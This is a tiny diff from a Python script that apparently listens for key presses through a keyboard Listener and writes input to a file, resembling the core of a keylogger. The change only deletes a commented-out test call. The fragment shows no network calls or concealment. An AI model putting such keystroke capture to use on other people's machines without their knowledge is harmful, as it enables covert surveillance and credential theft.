@@ -18,5 +18,5 @@ def write_to_file(word):
         f.write("")
 with Listener(on_press = on_press) as I:
     I.join()
-# write_to_file('adfa1234')
+
     
